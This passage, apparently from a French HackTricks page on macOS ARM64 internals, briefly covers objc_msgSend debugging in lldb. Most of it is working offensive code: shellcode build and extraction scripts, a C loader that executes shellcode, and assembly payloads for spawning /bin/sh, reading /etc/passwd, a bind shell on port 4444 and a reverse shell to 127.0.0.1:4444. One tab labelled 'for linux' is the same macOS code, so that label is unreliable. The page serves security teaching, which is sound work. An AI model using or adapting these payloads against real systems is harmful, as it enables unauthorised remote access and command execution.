Paramètres ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pointeur vers l'instance
- x1: op -> Sélecteur de la méthode
- x2... -> Reste des arguments de la méthode invoquée

Ainsi, si vous placez un breakpoint avant la branche vers cette fonction, vous pouvez facilement trouver ce qui est invoqué dans lldb avec (dans cet exemple l'objet appelle un objet de `NSConcreteTask` qui exécutera une commande):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> En définissant la variable d'environnement **`NSObjCMessageLoggingEnabled=1`**, il est possible de log quand cette fonction est appelée dans un fichier comme `/tmp/msgSends-pid`.
>
> De plus, en définissant **`OBJC_HELP=1`** et en appelant n'importe quel binary vous pouvez voir d'autres variables d'environnement que vous pourriez utiliser pour **log** quand certaines actions Objc-C se produisent.

Lorsque cette fonction est appelée, il faut trouver la méthode appelée de l'instance indiquée ; pour cela différentes recherches sont effectuées :

- Effectuer une recherche optimiste dans le cache :
- Si réussi, terminé
- Acquérir runtimeLock (read)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Tenter le cache propre de la classe :
- Si réussi, terminé
- Tester la liste des méthodes de la classe :
- Si trouvée, remplir le cache et terminé
- Tester le cache de la superclasse :
- Si réussi, terminé
- Tester la liste des méthodes de la superclasse :
- Si trouvée, remplir le cache et terminé
- If (resolver) try method resolver, and repeat from class lookup
- Si on en est encore là (= tout le reste a échoué) essayer forwarder

### Shellcodes

Pour compiler:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Pour extraire les octets :
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Pour les versions récentes de macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C code pour tester le shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Extrait de [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) et expliqué.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Lire avec cat

Le but est d'exécuter `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, donc le deuxième argument (x1) est un tableau de paramètres (ce qui en mémoire signifie une pile d'adresses).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invoquer une commande avec sh depuis un fork afin que le processus principal ne soit pas tué
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell depuis [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) sur le port **4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Depuis [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell vers **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
